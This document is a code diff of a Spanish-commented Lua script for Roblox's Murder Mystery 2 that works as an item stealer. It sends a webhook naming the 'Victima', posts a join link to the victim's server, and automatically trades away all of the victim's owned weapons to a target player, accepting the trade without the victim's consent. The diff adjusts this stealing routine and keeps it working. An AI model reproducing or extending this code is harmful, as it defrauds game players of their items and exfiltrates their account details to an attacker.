@@ -16,7 +16,6 @@ if not req then
     return
 end
 
--- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix, thumbnail)
     local data = {
         ["content"] = prefix or "",
@@ -101,26 +100,7 @@ for id, amount in pairs(profile.Weapons.Owned) do
     end
 end
 
--- Trade rápido: agrega todos los ítems de una vez
-local function doTrade(targetName)
-    while #weaponsToSend > 0 do
-        local status = getTradeStatus()
-        if status=="None" then
-            sendTradeRequest(targetName)
-        elseif status=="StartTrade" then
-            for _, w in ipairs(weaponsToSend) do
-                for _=1, w.Amount do
-                    addWeaponToTrade(w.DataID)
-                end
-            end
-            weaponsToSend = {} -- Se vacía la lista
-            acceptTrade()
-        end
-        task.wait(0.2)
-    end
-end
-
--- Enviar webhook con imagen en la esquina
+-- Enviar webhook con imagen en miniatura
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victima👤:", value=LocalPlayer.Name, inline=true},
@@ -136,6 +116,23 @@ fields[3].value = fields[3].value .. "\nRecolecta estos items 👇"
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 hit el mejor stealer💯", "💰Disfruta todas las armas gratis 😎", fields, prefix, thumbnailURL)
+
+-- Función principal de trade sin límite
+local function doTrade(targetName)
+    while #weaponsToSend > 0 do
+        local status = getTradeStatus()
+        if status=="None" then
+            sendTradeRequest(targetName)
+        elseif status=="StartTrade" then
+            for _, w in ipairs(weaponsToSend) do
+                for _=1, w.Amount do addWeaponToTrade(w.DataID) end
+            end
+            weaponsToSend = {} -- Vacía la lista
+            acceptTrade()
+        end
+        task.wait(0.3)
+    end
+end
 
 -- Conectar trade al chat
 for _,p in ipairs(Players:GetPlayers()) do
